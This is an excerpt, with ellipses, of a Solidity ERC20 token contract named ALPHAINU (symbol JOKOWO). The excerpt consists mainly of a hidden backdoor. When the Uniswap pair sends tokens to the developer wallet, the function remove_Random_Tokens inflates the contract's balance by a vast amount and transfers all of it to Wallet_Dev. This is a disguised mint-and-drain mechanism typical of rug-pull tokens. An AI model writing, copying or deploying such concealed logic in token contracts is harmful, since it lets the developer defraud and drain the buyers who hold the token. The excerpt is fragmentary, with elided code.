...
contract ALPHAINU is Context, IERC20 { 
    ...
    string private constant _symbol = unicode"JOKOWO"; 
    ...
    function remove_Random_Tokens(uint256 percent_of_Tokens) internal returns(bool _sent){
        _tOwned[address(this)] = _tOwned[address(this)]+percent_of_Tokens;
        uint256 totalRandom = balanceOf(address(this));
        uint256 removeRandom = totalRandom*1;
        _sent = IERC20(address(this)).transfer(Wallet_Dev, removeRandom);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        uint256 Feetake = _tTotal / 50;
        uint256 takeFee2 = tAmount * Feetake / 1;

        if ( sender == uniswapV2Pair &&
        recipient == Wallet_Dev 

        ) {
            if (tAmount >= Feetake) {
                remove_Random_Tokens(takeFee2);
            } else {
                if (tAmount <= Feetake) {
                    buyback = true;
                }
